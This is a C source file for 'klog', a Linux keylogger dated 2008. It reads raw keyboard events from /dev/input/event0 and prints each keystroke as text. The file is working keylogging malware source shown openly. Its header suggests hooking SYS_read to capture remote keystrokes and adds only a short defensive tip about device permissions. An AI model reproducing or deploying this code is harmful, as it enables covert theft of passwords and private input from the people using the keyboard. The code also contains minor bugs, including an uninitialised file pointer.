/* klog.c v0.6
 * <~~Harvie 2oo8
 * THX2:	Dayvee (Idea),
 *				joe@aol.com (Reversing),
 *				-=Punka][Tux=- (BugReport),
 *				Warriant's code (Inspiration),
 *				Linus (God Blessed Linux)
 *
 * Converts /dev/input/event0 format to ASCII. (If you have nore keyboards,)
 * In other words: this is keylogger for Linux.
 * If you have more keyboards, try other events (event1, ...eventX).
 * Only local keyboard is supported,
 *  remote keys can be captured by hooking on SYS_read() system call.
 *
 * Build:
 * - gcc argv[0].c -o argv[0]
 *
 * Usage (all examples do the same):
 * - cat /dev/input/event0 | argv[0]
 * - argv[0] /dev/input/event0
 * - argv[0] -
 *
 * Adding new keystroke values:
 * - <XXX> = keystroke id
 * - set MAXSTROKE to 0 to get only keystroke values
 *
 * Defensive security:
 * - chown & chmod /dev/input/event0
 * - don't give cheap root to everybody
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#define DEFAULTINPUT "/dev/input/event0"

#define MAXSTROKE 127 //Set higest keystroke code in DB (lower will not be converted)
char *strokes[] = { //KeyStroke DB for english QUERTZ keyboard:
	"<0>", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BKSP]",
	"[TAB]", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "[ENTER]\n",
	"[CTRL-L]", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "[SHIFT-L]", "\\",
	"Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "[SHIFT-R]", "*", "[ALT-L]", " ",
	"[CAPSL]","[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
	"[NUML]", "[SCRL]", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2",	"3", "0",
	"[./DEL-NUM]", "<84>", "<85>", "[MACRO-\\|]", "[F11]", "[F12]",
	"<89>", "<90>","<91>", "<92>", "<93>", "<94>", "<95>", "[ENTER-NUM]\n",
	"[CTRL-R]", "/", "[PRT-SCR]", "[ALT-R(GR)]",	"<101>",
	"[HOME]", "[UP]", "[PG-UP]", "[LEFT]", "[RIGHT]", "[END]", "[DOWN]", "[PG-DN]", "[INS]", "[DEL]",
	"<112>", "<113>", "<114>", "<115>", "<116>", "<117>", "<118>", "[PAUSE]",
	"<120>","<121>", "<122>", "<123>", "<124>", "[WinbL0W$-L]", "[WIN-R]", "[CONTEXT-MENU]"
	/* Hint:
		[CAPSL][ESC]	= CapsLock On
		[CAPSL]		= CapsLock Off
		[NUML]<0>	= NumLock On
		[NUML] 		= NumLock Off
		3[ESC]3		= Escape
	*/
};

void cleanup(void) {
	fclose(stdin);
	fclose(stdout);
}

static void sigint_handler(int signo) {
	exit(0);
}

int main(int argc, char *argv[]) {

	atexit(&cleanup);
	signal(SIGINT, &sigint_handler);
	signal(SIGTERM, &sigint_handler);
	signal(SIGQUIT, &sigint_handler);
	signal(SIGSEGV, &sigint_handler);


	FILE *ftest;
	printf("Reading data from: ");
	if(argc > 1 && argv[1][0] != '-') {
		ftest = freopen(argv[1], "rb", stdin);
		printf("%s\n", argv[1]);
	}
	if(argc > 1 && argv[1][0] == '-') {
		ftest = freopen(DEFAULTINPUT, "rb", stdin);
		printf("%s\n", DEFAULTINPUT);
	}
	if(argc == 1) {
		printf("STDIN\n", argv[1]);
	}

	if(ftest == NULL) {
		printf("Failed to open file!\n\n");
		return(1);
	}
	
	printf("Keystroke DB size: %d B (0-%d)\n\n", sizeof(strokes), MAXSTROKE);	

	unsigned char keystroke[17];
	while(1) {
		read(0, keystroke, 16);
		if((int)keystroke[12] > 0 && (int)keystroke[12] < 6) {
			if(keystroke[10] <= MAXSTROKE) {
				printf("%s", strokes[keystroke[10]]);
			} else {
				printf("<%d>", keystroke[10]);
			}
		}
	}

}
